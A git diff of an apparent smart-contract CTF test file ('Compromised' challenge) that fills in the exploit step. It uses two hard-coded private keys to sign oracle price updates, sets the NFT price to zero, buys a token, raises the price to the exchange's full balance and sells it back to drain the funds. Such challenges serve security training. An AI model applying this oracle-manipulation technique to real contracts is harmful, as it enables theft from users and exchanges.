@@ -50,7 +50,44 @@ describe('Compromised challenge', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+
+        const keys = [
+            '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9',
+            '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+        ];
+
+        const postPrice = async (price) => {
+            const txdata = await this.oracle.contract.methods.postPrice("DVNFT", price)
+            const tx = {
+                to: this.oracle.address,
+                data: txdata.encodeABI(),
+                gas: 50000
+            };
+
+            for (key of keys) {
+                const signedtx = await web3.eth.accounts.signTransaction(tx, key);
+                await web3.eth.sendSignedTransaction(signedtx.rawTransaction);
+            }
+        }
+
+        // Initial state
+        console.log("DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Update oracle price to 0
+        await postPrice(0);
+        console.log("DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Purchase token for free
+        await this.exchange.buyOne({from: attacker, value: 1});
+
+        // Update oracle price to all exchange balance
+        await postPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        console.log("DVNFT Price:",web3.utils.fromWei(await this.oracle.getMedianPrice("DVNFT")),"ETH");
+
+        // Approve transfer and sell token for the new price
+        await this.token.approve(this.exchange.address, 1, {from:attacker});
+        await this.exchange.sellOne(1, {from: attacker});
+
     });
 
     after(async function () {
